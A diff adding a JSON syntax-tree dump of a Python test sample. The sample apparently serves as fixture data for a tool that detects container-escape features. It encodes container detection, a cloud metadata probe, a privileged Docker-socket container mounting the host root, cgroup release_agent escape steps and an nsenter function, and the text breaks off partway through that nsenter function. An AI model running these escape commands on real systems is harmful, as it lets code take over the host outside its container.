@@ -1,0 +1,2787 @@
+{
+  "metadata": {
+    "source_file": "..\\基础版\\测试示例_容器逃逸代码.py",
+    "python_version": "3.9.19",
+    "ast_version": "1.0"
+  },
+  "ast": {
+    "id": 0,
+    "type": "Module",
+    "lineno": null,
+    "col_offset": null,
+    "body": [
+      {
+        "id": 0,
+        "type": "Expr",
+        "lineno": 3,
+        "col_offset": 0,
+        "value": {
+          "id": 1,
+          "type": "Constant",
+          "lineno": 3,
+          "col_offset": 0,
+          "value": "\n测试示例：包含多种容器逃逸特征的Python代码\n用于测试容器逃逸特征提取工具\n",
+          "kind": null
+        }
+      },
+      {
+        "id": 1,
+        "type": "Import",
+        "lineno": 8,
+        "col_offset": 0,
+        "names": [
+          {
+            "id": 100,
+            "type": "alias",
+            "lineno": null,
+            "col_offset": null,
+            "name": "os",
+            "asname": null
+          }
+        ]
+      },
+      {
+        "id": 2,
+        "type": "Import",
+        "lineno": 9,
+        "col_offset": 0,
+        "names": [
+          {
+            "id": 200,
+            "type": "alias",
+            "lineno": null,
+            "col_offset": null,
+            "name": "subprocess",
+            "asname": null
+          }
+        ]
+      },
+      {
+        "id": 3,
+        "type": "Import",
+        "lineno": 10,
+        "col_offset": 0,
+        "names": [
+          {
+            "id": 300,
+            "type": "alias",
+            "lineno": null,
+            "col_offset": null,
+            "name": "socket",
+            "asname": null
+          }
+        ]
+      },
+      {
+        "id": 4,
+        "type": "Import",
+        "lineno": 11,
+        "col_offset": 0,
+        "names": [
+          {
+            "id": 400,
+            "type": "alias",
+            "lineno": null,
+            "col_offset": null,
+            "name": "requests",
+            "asname": null
+          }
+        ]
+      },
+      {
+        "id": 5,
+        "type": "Import",
+        "lineno": 12,
+        "col_offset": 0,
+        "names": [
+          {
+            "id": 500,
+            "type": "alias",
+            "lineno": null,
+            "col_offset": null,
+            "name": "ctypes",
+            "asname": null
+          }
+        ]
+      },
+      {
+        "id": 6,
+        "type": "FunctionDef",
+        "lineno": 17,
+        "col_offset": 0,
+        "name": "check_container_env",
+        "args": {
+          "id": 61,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 600,
+            "type": "Expr",
+            "lineno": 18,
+            "col_offset": 4,
+            "value": {
+              "id": 6001,
+              "type": "Constant",
+              "lineno": 18,
+              "col_offset": 4,
+              "value": "检测是否在容器中运行",
+              "kind": null
+            }
+          },
+          {
+            "id": 601,
+            "type": "If",
+            "lineno": 19,
+            "col_offset": 4,
+            "test": {
+              "id": 6011,
+              "type": "Call",
+              "lineno": 19,
+              "col_offset": 7,
+              "func": {
+                "id": 60111,
+                "type": "Attribute",
+                "lineno": 19,
+                "col_offset": 7,
+                "value": {
+                  "id": 601111,
+                  "type": "Attribute",
+                  "lineno": 19,
+                  "col_offset": 7,
+                  "value": {
+                    "id": "os",
+                    "type": "Name",
+                    "lineno": 19,
+                    "col_offset": 7,
+                    "ctx": {
+                      "id": 60111111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "attr": "path",
+                  "ctx": {
+                    "id": 6011111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "exists",
+                "ctx": {
+                  "id": 601111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 601100,
+                  "type": "Constant",
+                  "lineno": 19,
+                  "col_offset": 22,
+                  "value": "/.dockerenv",
+                  "kind": null
+                }
+              ],
+              "keywords": []
+            },
+            "body": [
+              {
+                "id": 60100,
+                "type": "Expr",
+                "lineno": 20,
+                "col_offset": 8,
+                "value": {
+                  "id": 601001,
+                  "type": "Call",
+                  "lineno": 20,
+                  "col_offset": 8,
+                  "func": {
+                    "id": "print",
+                    "type": "Name",
+                    "lineno": 20,
+                    "col_offset": 8,
+                    "ctx": {
+                      "id": 60100111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [
+                    {
+                      "id": 60100100,
+                      "type": "Constant",
+                      "lineno": 20,
+                      "col_offset": 14,
+                      "value": "运行在Docker容器中",
+                      "kind": null
+                    }
+                  ],
+                  "keywords": []
+                }
+              }
+            ],
+            "orelse": []
+          },
+          {
+            "id": 602,
+            "type": "With",
+            "lineno": 22,
+            "col_offset": 4,
+            "items": [
+              {
+                "id": 60200,
+                "type": "withitem",
+                "lineno": null,
+                "col_offset": null,
+                "context_expr": {
+                  "id": 602001,
+                  "type": "Call",
+                  "lineno": 22,
+                  "col_offset": 9,
+                  "func": {
+                    "id": "open",
+                    "type": "Name",
+                    "lineno": 22,
+                    "col_offset": 9,
+                    "ctx": {
+                      "id": 60200111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [
+                    {
+                      "id": 60200100,
+                      "type": "Constant",
+                      "lineno": 22,
+                      "col_offset": 14,
+                      "value": "/proc/1/cgroup",
+                      "kind": null
+                    },
+                    {
+                      "id": 60200101,
+                      "type": "Constant",
+                      "lineno": 22,
+                      "col_offset": 32,
+                      "value": "r",
+                      "kind": null
+                    }
+                  ],
+                  "keywords": []
+                },
+                "optional_vars": {
+                  "id": "f",
+                  "type": "Name",
+                  "lineno": 22,
+                  "col_offset": 40,
+                  "ctx": {
+                    "id": 6020011,
+                    "type": "Store",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                }
+              }
+            ],
+            "body": [
+              {
+                "id": 60200,
+                "type": "Assign",
+                "lineno": 23,
+                "col_offset": 8,
+                "targets": [
+                  {
+                    "id": "cgroup_info",
+                    "type": "Name",
+                    "lineno": 23,
+                    "col_offset": 8,
+                    "ctx": {
+                      "id": 60200001,
+                      "type": "Store",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  }
+                ],
+                "value": {
+                  "id": 602001,
+                  "type": "Call",
+                  "lineno": 23,
+                  "col_offset": 22,
+                  "func": {
+                    "id": 6020011,
+                    "type": "Attribute",
+                    "lineno": 23,
+                    "col_offset": 22,
+                    "value": {
+                      "id": "f",
+                      "type": "Name",
+                      "lineno": 23,
+                      "col_offset": 22,
+                      "ctx": {
+                        "id": 602001111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "read",
+                    "ctx": {
+                      "id": 60200111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [],
+                  "keywords": []
+                },
+                "type_comment": null
+              },
+              {
+                "id": 60201,
+                "type": "If",
+                "lineno": 24,
+                "col_offset": 8,
+                "test": {
+                  "id": 602011,
+                  "type": "BoolOp",
+                  "lineno": 24,
+                  "col_offset": 11,
+                  "op": {
+                    "id": 6020111,
+                    "type": "Or",
+                    "lineno": null,
+                    "col_offset": null
+                  },
+                  "values": [
+                    {
+                      "id": 60201100,
+                      "type": "Compare",
+                      "lineno": 24,
+                      "col_offset": 11,
+                      "left": {
+                        "id": 602011001,
+                        "type": "Constant",
+                        "lineno": 24,
+                        "col_offset": 11,
+                        "value": "docker",
+                        "kind": null
+                      },
+                      "ops": [
+                        {
+                          "id": 6020110000,
+                          "type": "In",
+                          "lineno": null,
+                          "col_offset": null
+                        }
+                      ],
+                      "comparators": [
+                        {
+                          "id": "cgroup_info",
+                          "type": "Name",
+                          "lineno": 24,
+                          "col_offset": 23,
+                          "ctx": {
+                            "id": 60201100001,
+                            "type": "Load",
+                            "lineno": null,
+                            "col_offset": null
+                          }
+                        }
+                      ]
+                    },
+                    {
+                      "id": 60201101,
+                      "type": "Compare",
+                      "lineno": 24,
+                      "col_offset": 38,
+                      "left": {
+                        "id": 602011011,
+                        "type": "Constant",
+                        "lineno": 24,
+                        "col_offset": 38,
+                        "value": "kubepods",
+                        "kind": null
+                      },
+                      "ops": [
+                        {
+                          "id": 6020110100,
+                          "type": "In",
+                          "lineno": null,
+                          "col_offset": null
+                        }
+                      ],
+                      "comparators": [
+                        {
+                          "id": "cgroup_info",
+                          "type": "Name",
+                          "lineno": 24,
+                          "col_offset": 52,
+                          "ctx": {
+                            "id": 60201101001,
+                            "type": "Load",
+                            "lineno": null,
+                            "col_offset": null
+                          }
+                        }
+                      ]
+                    }
+                  ]
+                },
+                "body": [
+                  {
+                    "id": 6020100,
+                    "type": "Expr",
+                    "lineno": 25,
+                    "col_offset": 12,
+                    "value": {
+                      "id": 60201001,
+                      "type": "Call",
+                      "lineno": 25,
+                      "col_offset": 12,
+                      "func": {
+                        "id": "print",
+                        "type": "Name",
+                        "lineno": 25,
+                        "col_offset": 12,
+                        "ctx": {
+                          "id": 6020100111,
+                          "type": "Load",
+                          "lineno": null,
+                          "col_offset": null
+                        }
+                      },
+                      "args": [
+                        {
+                          "id": 6020100100,
+                          "type": "Constant",
+                          "lineno": 25,
+                          "col_offset": 18,
+                          "value": "检测到容器环境",
+                          "kind": null
+                        }
+                      ],
+                      "keywords": []
+                    }
+                  }
+                ],
+                "orelse": []
+              }
+            ],
+            "type_comment": null
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 7,
+        "type": "FunctionDef",
+        "lineno": 28,
+        "col_offset": 0,
+        "name": "probe_cloud_metadata",
+        "args": {
+          "id": 71,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 700,
+            "type": "Expr",
+            "lineno": 29,
+            "col_offset": 4,
+            "value": {
+              "id": 7001,
+              "type": "Constant",
+              "lineno": 29,
+              "col_offset": 4,
+              "value": "尝试访问云厂商元数据服务",
+              "kind": null
+            }
+          },
+          {
+            "id": 701,
+            "type": "Try",
+            "lineno": 30,
+            "col_offset": 4,
+            "body": [
+              {
+                "id": 70100,
+                "type": "Assign",
+                "lineno": 32,
+                "col_offset": 8,
+                "targets": [
+                  {
+                    "id": "response",
+                    "type": "Name",
+                    "lineno": 32,
+                    "col_offset": 8,
+                    "ctx": {
+                      "id": 70100001,
+                      "type": "Store",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  }
+                ],
+                "value": {
+                  "id": 701001,
+                  "type": "Call",
+                  "lineno": 32,
+                  "col_offset": 19,
+                  "func": {
+                    "id": 7010011,
+                    "type": "Attribute",
+                    "lineno": 32,
+                    "col_offset": 19,
+                    "value": {
+                      "id": "requests",
+                      "type": "Name",
+                      "lineno": 32,
+                      "col_offset": 19,
+                      "ctx": {
+                        "id": 701001111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "get",
+                    "ctx": {
+                      "id": 70100111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [
+                    {
+                      "id": 70100100,
+                      "type": "Constant",
+                      "lineno": 32,
+                      "col_offset": 32,
+                      "value": "http://169.254.169.254/latest/meta-data/",
+                      "kind": null
+                    }
+                  ],
+                  "keywords": [
+                    {
+                      "id": 70100100,
+                      "type": "keyword",
+                      "lineno": 32,
+                      "col_offset": 76,
+                      "arg": "timeout",
+                      "value": {
+                        "id": 701001001,
+                        "type": "Constant",
+                        "lineno": 32,
+                        "col_offset": 84,
+                        "value": "2",
+                        "kind": null
+                      }
+                    }
+                  ]
+                },
+                "type_comment": null
+              },
+              {
+                "id": 70101,
+                "type": "If",
+                "lineno": 33,
+                "col_offset": 8,
+                "test": {
+                  "id": 701011,
+                  "type": "Compare",
+                  "lineno": 33,
+                  "col_offset": 11,
+                  "left": {
+                    "id": 7010111,
+                    "type": "Attribute",
+                    "lineno": 33,
+                    "col_offset": 11,
+                    "value": {
+                      "id": "response",
+                      "type": "Name",
+                      "lineno": 33,
+                      "col_offset": 11,
+                      "ctx": {
+                        "id": 701011111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "status_code",
+                    "ctx": {
+                      "id": 70101111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "ops": [
+                    {
+                      "id": 70101100,
+                      "type": "Eq",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  ],
+                  "comparators": [
+                    {
+                      "id": 70101100,
+                      "type": "Constant",
+                      "lineno": 33,
+                      "col_offset": 35,
+                      "value": "200",
+                      "kind": null
+                    }
+                  ]
+                },
+                "body": [
+                  {
+                    "id": 7010100,
+                    "type": "Expr",
+                    "lineno": 34,
+                    "col_offset": 12,
+                    "value": {
+                      "id": 70101001,
+                      "type": "Call",
+                      "lineno": 34,
+                      "col_offset": 12,
+                      "func": {
+                        "id": "print",
+                        "type": "Name",
+                        "lineno": 34,
+                        "col_offset": 12,
+                        "ctx": {
+                          "id": 7010100111,
+                          "type": "Load",
+                          "lineno": null,
+                          "col_offset": null
+                        }
+                      },
+                      "args": [
+                        {
+                          "id": 7010100100,
+                          "type": "Constant",
+                          "lineno": 34,
+                          "col_offset": 18,
+                          "value": "发现AWS元数据服务",
+                          "kind": null
+                        }
+                      ],
+                      "keywords": []
+                    }
+                  }
+                ],
+                "orelse": []
+              }
+            ],
+            "handlers": [
+              {
+                "id": 70100,
+                "type": null,
+                "lineno": 35,
+                "col_offset": 4,
+                "name": null,
+                "body": [
+                  {
+                    "id": 7010000,
+                    "type": "Pass",
+                    "lineno": 36,
+                    "col_offset": 8
+                  }
+                ]
+              }
+            ],
+            "orelse": [],
+            "finalbody": []
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 8,
+        "type": "FunctionDef",
+        "lineno": 39,
+        "col_offset": 0,
+        "name": "probe_k8s_api",
+        "args": {
+          "id": 81,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 800,
+            "type": "Expr",
+            "lineno": 40,
+            "col_offset": 4,
+            "value": {
+              "id": 8001,
+              "type": "Constant",
+              "lineno": 40,
+              "col_offset": 4,
+              "value": "探测Kubernetes API",
+              "kind": null
+            }
+          },
+          {
+            "id": 801,
+            "type": "Assign",
+            "lineno": 41,
+            "col_offset": 4,
+            "targets": [
+              {
+                "id": "k8s_host",
+                "type": "Name",
+                "lineno": 41,
+                "col_offset": 4,
+                "ctx": {
+                  "id": 801001,
+                  "type": "Store",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              }
+            ],
+            "value": {
+              "id": 8011,
+              "type": "Call",
+              "lineno": 41,
+              "col_offset": 15,
+              "func": {
+                "id": 80111,
+                "type": "Attribute",
+                "lineno": 41,
+                "col_offset": 15,
+                "value": {
+                  "id": 801111,
+                  "type": "Attribute",
+                  "lineno": 41,
+                  "col_offset": 15,
+                  "value": {
+                    "id": "os",
+                    "type": "Name",
+                    "lineno": 41,
+                    "col_offset": 15,
+                    "ctx": {
+                      "id": 80111111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "attr": "environ",
+                  "ctx": {
+                    "id": 8011111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "get",
+                "ctx": {
+                  "id": 801111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 801100,
+                  "type": "Constant",
+                  "lineno": 41,
+                  "col_offset": 30,
+                  "value": "KUBERNETES_SERVICE_HOST",
+                  "kind": null
+                }
+              ],
+              "keywords": []
+            },
+            "type_comment": null
+          },
+          {
+            "id": 802,
+            "type": "If",
+            "lineno": 42,
+            "col_offset": 4,
+            "test": {
+              "id": "k8s_host",
+              "type": "Name",
+              "lineno": 42,
+              "col_offset": 7,
+              "ctx": {
+                "id": 80211,
+                "type": "Load",
+                "lineno": null,
+                "col_offset": null
+              }
+            },
+            "body": [
+              {
+                "id": 80200,
+                "type": "Expr",
+                "lineno": 43,
+                "col_offset": 8,
+                "value": {
+                  "id": 802001,
+                  "type": "Call",
+                  "lineno": 43,
+                  "col_offset": 8,
+                  "func": {
+                    "id": "print",
+                    "type": "Name",
+                    "lineno": 43,
+                    "col_offset": 8,
+                    "ctx": {
+                      "id": 80200111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [
+                    {
+                      "id": 80200100,
+                      "type": "JoinedStr",
+                      "lineno": 43,
+                      "col_offset": 14,
+                      "values": [
+                        {
+                          "id": 8020010000,
+                          "type": "Constant",
+                          "lineno": 43,
+                          "col_offset": 14,
+                          "value": "发现K8s API: ",
+                          "kind": null
+                        },
+                        {
+                          "id": 8020010001,
+                          "type": "FormattedValue",
+                          "lineno": 43,
+                          "col_offset": 14,
+                          "value": {
+                            "id": "k8s_host",
+                            "type": "Name",
+                            "lineno": 43,
+                            "col_offset": 32,
+                            "ctx": {
+                              "id": 802001000111,
+                              "type": "Load",
+                              "lineno": null,
+                              "col_offset": null
+                            }
+                          },
+                          "conversion": "-1",
+                          "format_spec": null
+                        }
+                      ]
+                    }
+                  ],
+                  "keywords": []
+                }
+              }
+            ],
+            "orelse": []
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 9,
+        "type": "FunctionDef",
+        "lineno": 48,
+        "col_offset": 0,
+        "name": "exploit_docker_socket",
+        "args": {
+          "id": 91,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 900,
+            "type": "Expr",
+            "lineno": 49,
+            "col_offset": 4,
+            "value": {
+              "id": 9001,
+              "type": "Constant",
+              "lineno": 49,
+              "col_offset": 4,
+              "value": "利用Docker Socket创建特权容器",
+              "kind": null
+            }
+          },
+          {
+            "id": 901,
+            "type": "If",
+            "lineno": 50,
+            "col_offset": 4,
+            "test": {
+              "id": 9011,
+              "type": "Call",
+              "lineno": 50,
+              "col_offset": 7,
+              "func": {
+                "id": 90111,
+                "type": "Attribute",
+                "lineno": 50,
+                "col_offset": 7,
+                "value": {
+                  "id": 901111,
+                  "type": "Attribute",
+                  "lineno": 50,
+                  "col_offset": 7,
+                  "value": {
+                    "id": "os",
+                    "type": "Name",
+                    "lineno": 50,
+                    "col_offset": 7,
+                    "ctx": {
+                      "id": 90111111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "attr": "path",
+                  "ctx": {
+                    "id": 9011111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "exists",
+                "ctx": {
+                  "id": 901111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 901100,
+                  "type": "Constant",
+                  "lineno": 50,
+                  "col_offset": 22,
+                  "value": "/var/run/docker.sock",
+                  "kind": null
+                }
+              ],
+              "keywords": []
+            },
+            "body": [
+              {
+                "id": 90100,
+                "type": "Assign",
+                "lineno": 52,
+                "col_offset": 8,
+                "targets": [
+                  {
+                    "id": "cmd",
+                    "type": "Name",
+                    "lineno": 52,
+                    "col_offset": 8,
+                    "ctx": {
+                      "id": 90100001,
+                      "type": "Store",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  }
+                ],
+                "value": {
+                  "id": 901001,
+                  "type": "Constant",
+                  "lineno": 52,
+                  "col_offset": 14,
+                  "value": "docker run -it --privileged -v /:/host alpine /bin/sh",
+                  "kind": null
+                },
+                "type_comment": null
+              },
+              {
+                "id": 90101,
+                "type": "Expr",
+                "lineno": 53,
+                "col_offset": 8,
+                "value": {
+                  "id": 901011,
+                  "type": "Call",
+                  "lineno": 53,
+                  "col_offset": 8,
+                  "func": {
+                    "id": 9010111,
+                    "type": "Attribute",
+                    "lineno": 53,
+                    "col_offset": 8,
+                    "value": {
+                      "id": "os",
+                      "type": "Name",
+                      "lineno": 53,
+                      "col_offset": 8,
+                      "ctx": {
+                        "id": 901011111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "system",
+                    "ctx": {
+                      "id": 90101111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [
+                    {
+                      "id": "cmd",
+                      "type": "Name",
+                      "lineno": 53,
+                      "col_offset": 18,
+                      "ctx": {
+                        "id": 901011001,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    }
+                  ],
+                  "keywords": []
+                }
+              }
+            ],
+            "orelse": []
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 10,
+        "type": "FunctionDef",
+        "lineno": 56,
+        "col_offset": 0,
+        "name": "exploit_cgroup_release_agent",
+        "args": {
+          "id": 101,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 1000,
+            "type": "Expr",
+            "lineno": 57,
+            "col_offset": 4,
+            "value": {
+              "id": 10001,
+              "type": "Constant",
+              "lineno": 57,
+              "col_offset": 4,
+              "value": "利用Cgroup Release Agent逃逸",
+              "kind": null
+            }
+          },
+          {
+            "id": 1001,
+            "type": "Expr",
+            "lineno": 59,
+            "col_offset": 4,
+            "value": {
+              "id": 10011,
+              "type": "Call",
+              "lineno": 59,
+              "col_offset": 4,
+              "func": {
+                "id": 100111,
+                "type": "Attribute",
+                "lineno": 59,
+                "col_offset": 4,
+                "value": {
+                  "id": "os",
+                  "type": "Name",
+                  "lineno": 59,
+                  "col_offset": 4,
+                  "ctx": {
+                    "id": 10011111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "system",
+                "ctx": {
+                  "id": 1001111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 1001100,
+                  "type": "Constant",
+                  "lineno": 59,
+                  "col_offset": 14,
+                  "value": "mount -t cgroup -o memory cgroup /tmp/cgroup",
+                  "kind": null
+                }
+              ],
+              "keywords": []
+            }
+          },
+          {
+            "id": 1002,
+            "type": "With",
+            "lineno": 62,
+            "col_offset": 4,
+            "items": [
+              {
+                "id": 100200,
+                "type": "withitem",
+                "lineno": null,
+                "col_offset": null,
+                "context_expr": {
+                  "id": 1002001,
+                  "type": "Call",
+                  "lineno": 62,
+                  "col_offset": 9,
+                  "func": {
+                    "id": "open",
+                    "type": "Name",
+                    "lineno": 62,
+                    "col_offset": 9,
+                    "ctx": {
+                      "id": 100200111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [
+                    {
+                      "id": 100200100,
+                      "type": "Constant",
+                      "lineno": 62,
+                      "col_offset": 14,
+                      "value": "/tmp/cgroup/release_agent",
+                      "kind": null
+                    },
+                    {
+                      "id": 100200101,
+                      "type": "Constant",
+                      "lineno": 62,
+                      "col_offset": 43,
+                      "value": "w",
+                      "kind": null
+                    }
+                  ],
+                  "keywords": []
+                },
+                "optional_vars": {
+                  "id": "f",
+                  "type": "Name",
+                  "lineno": 62,
+                  "col_offset": 51,
+                  "ctx": {
+                    "id": 10020011,
+                    "type": "Store",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                }
+              }
+            ],
+            "body": [
+              {
+                "id": 100200,
+                "type": "Expr",
+                "lineno": 63,
+                "col_offset": 8,
+                "value": {
+                  "id": 1002001,
+                  "type": "Call",
+                  "lineno": 63,
+                  "col_offset": 8,
+                  "func": {
+                    "id": 10020011,
+                    "type": "Attribute",
+                    "lineno": 63,
+                    "col_offset": 8,
+                    "value": {
+                      "id": "f",
+                      "type": "Name",
+                      "lineno": 63,
+                      "col_offset": 8,
+                      "ctx": {
+                        "id": 1002001111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "write",
+                    "ctx": {
+                      "id": 100200111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [
+                    {
+                      "id": 100200100,
+                      "type": "Constant",
+                      "lineno": 63,
+                      "col_offset": 16,
+                      "value": "/tmp/escape.sh",
+                      "kind": null
+                    }
+                  ],
+                  "keywords": []
+                }
+              }
+            ],
+            "type_comment": null
+          },
+          {
+            "id": 1003,
+            "type": "With",
+            "lineno": 66,
+            "col_offset": 4,
+            "items": [
+              {
+                "id": 100300,
+                "type": "withitem",
+                "lineno": null,
+                "col_offset": null,
+                "context_expr": {
+                  "id": 1003001,
+                  "type": "Call",
+                  "lineno": 66,
+                  "col_offset": 9,
+                  "func": {
+                    "id": "open",
+                    "type": "Name",
+                    "lineno": 66,
+                    "col_offset": 9,
+                    "ctx": {
+                      "id": 100300111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [
+                    {
+                      "id": 100300100,
+                      "type": "Constant",
+                      "lineno": 66,
+                      "col_offset": 14,
+                      "value": "/tmp/cgroup/notify_on_release",
+                      "kind": null
+                    },
+                    {
+                      "id": 100300101,
+                      "type": "Constant",
+                      "lineno": 66,
+                      "col_offset": 47,
+                      "value": "w",
+                      "kind": null
+                    }
+                  ],
+                  "keywords": []
+                },
+                "optional_vars": {
+                  "id": "f",
+                  "type": "Name",
+                  "lineno": 66,
+                  "col_offset": 55,
+                  "ctx": {
+                    "id": 10030011,
+                    "type": "Store",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                }
+              }
+            ],
+            "body": [
+              {
+                "id": 100300,
+                "type": "Expr",
+                "lineno": 67,
+                "col_offset": 8,
+                "value": {
+                  "id": 1003001,
+                  "type": "Call",
+                  "lineno": 67,
+                  "col_offset": 8,
+                  "func": {
+                    "id": 10030011,
+                    "type": "Attribute",
+                    "lineno": 67,
+                    "col_offset": 8,
+                    "value": {
+                      "id": "f",
+                      "type": "Name",
+                      "lineno": 67,
+                      "col_offset": 8,
+                      "ctx": {
+                        "id": 1003001111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "write",
+                    "ctx": {
+                      "id": 100300111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [
+                    {
+                      "id": 100300100,
+                      "type": "Constant",
+                      "lineno": 67,
+                      "col_offset": 16,
+                      "value": "1",
+                      "kind": null
+                    }
+                  ],
+                  "keywords": []
+                }
+              }
+            ],
+            "type_comment": null
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 11,
+        "type": "FunctionDef",
+        "lineno": 70,
+        "col_offset": 0,
+        "name": "exploit_with_ctypes",
+        "args": {
+          "id": 111,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 1100,
+            "type": "Expr",
+            "lineno": 71,
+            "col_offset": 4,
+            "value": {
+              "id": 11001,
+              "type": "Constant",
+              "lineno": 71,
+              "col_offset": 4,
+              "value": "使用ctypes直接调用libc函数",
+              "kind": null
+            }
+          },
+          {
+            "id": 1101,
+            "type": "Assign",
+            "lineno": 72,
+            "col_offset": 4,
+            "targets": [
+              {
+                "id": "libc",
+                "type": "Name",
+                "lineno": 72,
+                "col_offset": 4,
+                "ctx": {
+                  "id": 1101001,
+                  "type": "Store",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              }
+            ],
+            "value": {
+              "id": 11011,
+              "type": "Call",
+              "lineno": 72,
+              "col_offset": 11,
+              "func": {
+                "id": 110111,
+                "type": "Attribute",
+                "lineno": 72,
+                "col_offset": 11,
+                "value": {
+                  "id": "ctypes",
+                  "type": "Name",
+                  "lineno": 72,
+                  "col_offset": 11,
+                  "ctx": {
+                    "id": 11011111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "CDLL",
+                "ctx": {
+                  "id": 1101111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 1101100,
+                  "type": "Constant",
+                  "lineno": 72,
+                  "col_offset": 23,
+                  "value": "libc.so.6",
+                  "kind": null
+                }
+              ],
+              "keywords": []
+            },
+            "type_comment": null
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 12,
+        "type": "FunctionDef",
+        "lineno": 81,
+        "col_offset": 0,
+        "name": "exploit_nsenter",
+        "args": {
+          "id": 121,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 1200,
+            "type": "Expr",
+            "lineno": 82,
+            "col_offset": 4,
+            "value": {
+              "id": 12001,
+              "type": "Constant",
+              "lineno": 82,
+              "col_offset": 4,
+              "value": "使用nsenter进入宿主机命名空间",
